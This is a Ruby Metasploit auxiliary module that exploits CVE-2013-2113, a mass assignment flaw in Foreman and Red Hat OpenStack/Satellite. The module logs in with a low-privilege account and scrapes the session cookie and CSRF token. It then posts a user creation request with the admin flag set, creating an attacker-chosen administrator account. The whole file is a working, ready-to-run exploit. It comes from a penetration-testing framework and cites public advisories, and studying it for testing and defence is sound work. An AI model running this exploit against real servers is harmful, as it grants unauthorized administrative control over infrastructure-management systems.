##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize
		super(
			'Name'           => 'Foreman (Red Hat OpenStack/Satellite) users/create Mass Assignment',
			'Description'    => %q{
					This module exploits a mass assignment vulnerability in the 'create'
				action of 'users' controller of Foreman and Red Hat OpenStack/Satellite
				(Foreman 1.2.0-RC1 and earlier) by creating an arbitrary administrator
				account. For this exploit to work, your account must have 'create_users'
				permission (e.g., Manager role).
			},
			'Author'         => 'Ramon de C Valle',
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['BID', '60835'],
					['CVE', '2013-2113'],
					['CWE', '915'],
					['OSVDB', '94655'],
					['URL', 'https://bugzilla.redhat.com/show_bug.cgi?id=966804'],
					['URL', 'http://projects.theforeman.org/issues/2630']
				],
			'DisclosureDate' => 'Jun 6 2013'
		)

		register_options(
			[
				Opt::RPORT(443),
				OptBool.new('SSL', [true, 'Use SSL', true]),
				OptString.new('USERNAME', [true, 'Your username']),
				OptString.new('PASSWORD', [true, 'Your password']),
				OptString.new('NEWUSERNAME', [true, 'The username of the new admin account']),
				OptString.new('NEWPASSWORD', [true, 'The password of the new admin account']),
				OptString.new('NEWEMAIL', [true, 'The email of the new admin account']),
				OptString.new('TARGETURI', [ true, 'The path to the application', '/']),
			], self.class
		)
	end

	def run
		print_status("Logging into #{target_url}...")
		res = send_request_cgi(
			'method'    => 'POST',
			'uri'       => normalize_uri(target_uri.path, 'users', 'login'),
			'vars_post' => {
				'login[login]'    => datastore['USERNAME'],
				'login[password]' => datastore['PASSWORD']
			}
		)

		if res.nil?
			print_error('No response from remote host')
			return
		end

		if res.headers['Location'] =~ /users\/login$/
			print_error('Authentication failed')
			return
		else
			session = $1 if res.headers['Set-Cookie'] =~ /_session_id=([0-9a-f]*)/

			if session.nil?
				print_error('Failed to retrieve the current session id')
				return
			end
		end

		print_status('Retrieving the CSRF token for this session...')
		res = send_request_cgi(
			'cookie' => "_session_id=#{session}",
			'method' => 'GET',
			'uri'    => normalize_uri(target_uri)
		)

		if res.nil?
			print_error('No response from remote host')
			return
		end

		if res.headers['Location'] =~ /users\/login$/
			print_error('Failed to retrieve the CSRF token')
			return
		else
			csrf_param = $1 if res.body =~ /<meta[ ]+content="(.*)"[ ]+name="csrf-param"[ ]*\/?>/i
			csrf_token = $1 if res.body =~ /<meta[ ]+content="(.*)"[ ]+name="csrf-token"[ ]*\/?>/i

			if csrf_param.nil? || csrf_token.nil?
				csrf_param = $1 if res.body =~ /<meta[ ]+name="csrf-param"[ ]+content="(.*)"[ ]*\/?>/i
				csrf_token = $1 if res.body =~ /<meta[ ]+name="csrf-token"[ ]+content="(.*)"[ ]*\/?>/i
			end

			if csrf_param.nil? || csrf_token.nil?
				print_error('Failed to retrieve the CSRF token')
				return
			end
		end

		print_status("Sending create-user request to #{target_url('users')}...")
		res = send_request_cgi(
			'cookie'    => "_session_id=#{session}",
			'method'    => 'POST',
			'uri'       => normalize_uri(target_uri.path, 'users'),
			'vars_post' => {
				csrf_param                    => csrf_token,
				'user[admin]'                 => 'true',
				'user[auth_source_id]'        => '1',
				'user[login]'                 => datastore['NEWUSERNAME'],
				'user[mail]'                  => datastore['NEWEMAIL'],
				'user[password]'              => datastore['NEWPASSWORD'],
				'user[password_confirmation]' => datastore['NEWPASSWORD']
			}
		)

		if res.nil?
			print_error('No response from remote host')
			return
		end

		if res.headers['Location'] =~ /users$/
			print_good('User created successfully')
		else
			print_error('Failed to create user')
		end
	end

	def target_url(*args)
		(ssl ? 'https' : 'http') +
			if rport.to_i == 80 || rport.to_i == 443
				"://#{vhost}"
			else
				"://#{vhost}:#{rport}"
			end + normalize_uri(target_uri.path, *args)
	end
end
